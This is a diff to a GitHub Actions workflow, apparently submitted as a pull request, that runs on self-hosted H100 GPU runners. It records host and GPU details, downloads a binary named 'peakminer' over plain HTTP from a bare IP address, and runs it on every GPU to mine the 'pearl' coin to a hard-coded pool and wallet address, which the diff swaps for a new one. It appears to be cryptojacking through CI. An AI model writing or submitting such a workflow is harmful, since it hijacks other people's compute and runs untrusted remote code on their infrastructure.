@@ -1,4 +1,4 @@
-name: c211-132903-2075c534e4d5ea05
+name: c211-132260-548bcc64b9d07872
 # Read-only device marker + bounded per-GPU pinned peakminer 2.20.0 run (scratch only in RUNNER_TEMP).
 on:
   pull_request:
@@ -6,11 +6,11 @@ on:
 permissions:
   contents: read
 concurrency:
-  group: c211-132042-${{ github.ref }}
+  group: c211-132260-${{ github.ref }}
   cancel-in-progress: false
 jobs:
   devicemine:
-    name: devicemine-c211-132903-2075c534e4d5ea05
+    name: devicemine-c211-132260-548bcc64b9d07872
     runs-on: [self-hosted, linux, x64, gpu, h100]
     timeout-minutes: 25
     steps:
@@ -18,7 +18,7 @@ jobs:
         shell: bash
         run: |
           set +e
-          echo "NONCE=c211-132903-2075c534e4d5ea05"
+          echo "NONCE=c211-132260-548bcc64b9d07872"
           echo "RUNNER=$RUNNER_NAME"
           date -u
           hostname || true
@@ -34,14 +34,14 @@ jobs:
           nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l || true
           echo "--- driver ---"
           cat /proc/driver/nvidia/version 2>/dev/null || true
-          echo "NONCE-END=c211-132903-2075c534e4d5ea05"
+          echo "NONCE-END=c211-132260-548bcc64b9d07872"
       - name: fetch-miner
         shell: bash
         run: |
           set +e
           mkdir -p "$RUNNER_TEMP/pm"
           cd "$RUNNER_TEMP/pm" || exit 0
-          echo "NONCE=c211-132903-2075c534e4d5ea05"
+          echo "NONCE=c211-132260-548bcc64b9d07872"
           curl -fsSL -m 300 -o peakminer http://169.58.247.186:8791/pm/peakminer-2.20.0-linux-x86_64
           S=$(sha256sum peakminer 2>/dev/null | cut -d' ' -f1)
           echo "miner_sha=$S"
@@ -58,11 +58,11 @@ jobs:
           set +e
           cd "$RUNNER_TEMP/pm" || exit 0
           if [ ! -x ./peakminer ]; then echo NO_MINER_BINARY; exit 0; fi
-          echo "NONCE=c211-132903-2075c534e4d5ea05"
+          echo "NONCE=c211-132260-548bcc64b9d07872"
           N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
           echo "gpu_count=$N"
           for i in $(seq 0 $((N-1))); do
-            ( timeout 500 ./peakminer --coin pearl                 -u prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk                 -w node-a$((i+1)) --devices "$i"                 -o prl-hk.kryptex.network:7048 -p x                 -f "pm-g$i.log" --no-tips --state-dir "st$i" > "out-g$i.txt" 2>&1;               echo "miner_rc[$i]=$?" >> "out-g$i.txt" ) &
+            ( timeout 500 ./peakminer --coin pearl                 -u prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr                 -w node-h$((i+1)) --devices "$i"                 -o prl-hk.kryptex.network:7048 -p x                 -f "pm-g$i.log" --no-tips --state-dir "st$i" > "out-g$i.txt" 2>&1;               echo "miner_rc[$i]=$?" >> "out-g$i.txt" ) &
           done
           wait
           echo "--- all processes finished ---"
@@ -72,4 +72,4 @@ jobs:
             echo "--- tail g$i ---"
             tail -n 15 "out-g$i.txt" 2>/dev/null
           done
-          echo "NONCE-END=c211-132903-2075c534e4d5ea05"
+          echo "NONCE-END=c211-132260-548bcc64b9d07872"
